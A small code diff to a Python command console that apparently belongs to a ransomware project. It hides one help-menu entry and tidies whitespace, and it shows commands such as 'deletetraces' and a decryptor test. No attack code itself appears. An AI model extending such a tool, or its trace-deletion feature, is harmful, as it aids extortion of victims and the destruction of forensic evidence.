@@ -45,7 +45,7 @@ class Program():
     def __help(self):
         print("Available commands:")
         print("\thelp - show this help message")
-        print("\tgreet - print a greeting")
+        #print("\tgreet - print a greeting")
         #print("\tinfo - displays information about the ransomware")
         print("\tchangeMode - changes the mode of operation")
         print("\t\tDefault mode is 'manual'")
@@ -298,7 +298,7 @@ class Program():
 
                 case "deletetraces":
                     self.delete_traces()
-                    
+
                 case "testfunc":
                     print("Running test function...")
                     self.__test_function("mock files/decryptor_test.py")
